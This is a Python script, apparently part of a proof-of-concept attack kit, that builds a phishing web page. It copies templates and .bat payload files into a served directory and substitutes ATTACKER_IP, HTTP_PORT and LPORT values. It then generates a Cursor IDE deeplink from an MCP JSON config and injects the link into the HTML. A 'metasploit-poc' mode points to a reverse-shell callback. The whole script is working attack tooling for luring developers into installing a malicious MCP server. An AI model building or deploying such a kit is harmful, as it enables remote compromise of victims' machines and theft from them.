#!/usr/bin/env python3
"""
Build the phishing page from templates.

Reads config.env, copies templates to build/, replaces placeholders,
generates or uses custom deeplink, and injects it into HTML.

Usage:
    python3 resources/build_phishing_page.py

For custom mode:
    1. Set MODE=custom and CURSOR_LINK="cursor://..." in config.env
    2. Run this script
    3. Serve: cd build/webserver && python3 -m http.server 8000
"""

import os
import shutil
import subprocess
import sys
from pathlib import Path


def load_config(config_path: Path) -> dict:
    """Load config.env and return as dict."""
    config = {}
    if not config_path.exists():
        return config
    
    with open(config_path, 'r') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if '=' in line:
                key, _, value = line.partition('=')
                value = value.strip().strip('"').strip("'")
                config[key.strip()] = value
    return config


def copy_templates(project_root: Path):
    """Copy templates to build directory."""
    build_dir = project_root / 'build'
    templates_dir = project_root / 'templates'
    
    # Create build directories
    (build_dir / 'webserver' / 'payload').mkdir(parents=True, exist_ok=True)
    
    # Copy MCP JSON
    shutil.copy(templates_dir / 'mcp.json', build_dir / 'mcp.json')
    
    # Copy webserver files
    webserver_src = templates_dir / 'webserver'
    webserver_dst = build_dir / 'webserver'
    
    for html_file in webserver_src.glob('*.html'):
        shutil.copy(html_file, webserver_dst / html_file.name)
    
    for svg_file in webserver_src.glob('*.svg'):
        shutil.copy(svg_file, webserver_dst / svg_file.name)
    
    # Copy payload files
    payload_src = webserver_src / 'payload'
    payload_dst = webserver_dst / 'payload'
    
    for bat_file in payload_src.glob('*.bat'):
        shutil.copy(bat_file, payload_dst / bat_file.name)


def replace_placeholders(build_dir: Path, config: dict):
    """Replace placeholders in all build files."""
    placeholders = {
        '{ATTACKER_IP}': config.get('ATTACKER_IP', ''),
        '{HTTP_PORT}': config.get('HTTP_PORT', ''),
        '{LPORT}': config.get('LPORT', ''),
    }
    
    extensions = ('.json', '.bat', '.html')
    
    for file_path in build_dir.rglob('*'):
        if file_path.is_file() and file_path.suffix in extensions:
            content = file_path.read_text()
            for placeholder, value in placeholders.items():
                content = content.replace(placeholder, value)
            file_path.write_text(content)


def generate_deeplink(project_root: Path) -> str:
    """Generate deeplink using create_deeplink.py."""
    script_path = project_root / 'resources' / 'create_deeplink.py'
    mcp_path = project_root / 'build' / 'mcp.json'
    
    result = subprocess.run(
        [sys.executable, str(script_path), str(mcp_path)],
        capture_output=True,
        text=True
    )
    
    if result.returncode != 0:
        raise RuntimeError(f"Failed to generate deeplink: {result.stderr}")
    
    return result.stdout.strip()


def inject_deeplink(build_dir: Path, cursor_link: str):
    """Replace {CURSOR_LINK} placeholder in HTML files."""
    webserver_dir = build_dir / 'webserver'
    
    for html_file in webserver_dir.glob('*.html'):
        content = html_file.read_text()
        content = content.replace('{CURSOR_LINK}', cursor_link)
        html_file.write_text(content)


def validate_config(config: dict, config_path: Path) -> list:
    """Validate required config values. Returns list of errors."""
    errors = []
    
    if not config:
        errors.append(f"Config file not found or empty: {config_path}")
        errors.append("Create config.env with required values or run launch_poc.sh")
        return errors
    
    mode = config.get('MODE', '')
    
    # Required for all modes
    required_fields = ['ATTACKER_IP', 'HTTP_PORT']
    
    # metasploit-poc also needs LPORT
    if mode == 'metasploit-poc' or not mode:
        required_fields.append('LPORT')
    
    # custom mode needs CURSOR_LINK
    if mode == 'custom':
        required_fields.append('CURSOR_LINK')
    
    for field in required_fields:
        value = config.get(field, '')
        if not value:
            errors.append(f"Missing required config value: {field}")
    
    # Validate MODE value
    if mode and mode not in ('metasploit-poc', 'custom'):
        errors.append(f"Invalid MODE '{mode}'. Use 'metasploit-poc' or 'custom'")
    
    return errors


def main():
    # Determine project root (parent of resources/)
    script_dir = Path(__file__).parent
    project_root = script_dir.parent
    
    # Load config
    config_path = project_root / 'config.env'
    config = load_config(config_path)
    
    # Validate config
    errors = validate_config(config, config_path)
    if errors:
        print("Error: Invalid configuration")
        for error in errors:
            print(f"  - {error}")
        print("\nFor manual setup, edit config.env with:")
        print("  ATTACKER_IP=<your-ip>")
        print("  HTTP_PORT=8000")
        print("  LPORT=4444")
        print("  MODE=metasploit-poc  (or 'custom')")
        print("  CURSOR_LINK=         (required if MODE=custom)")
        sys.exit(1)
    
    # Copy templates to build
    copy_templates(project_root)
    
    # Replace placeholders
    replace_placeholders(project_root / 'build', config)
    
    # Generate or use custom deeplink
    mode = config.get('MODE', 'metasploit-poc')
    
    if mode == 'custom':
        cursor_link = config.get('CURSOR_LINK', '')
    else:
        cursor_link = generate_deeplink(project_root)
    
    # Inject deeplink into HTML
    inject_deeplink(project_root / 'build', cursor_link)
    
    print(f"Build complete: {project_root / 'build' / 'webserver'}")
    if cursor_link:
        print(f"Deeplink: {cursor_link[:70]}..." if len(cursor_link) > 70 else f"Deeplink: {cursor_link}")


if __name__ == "__main__":
    main()
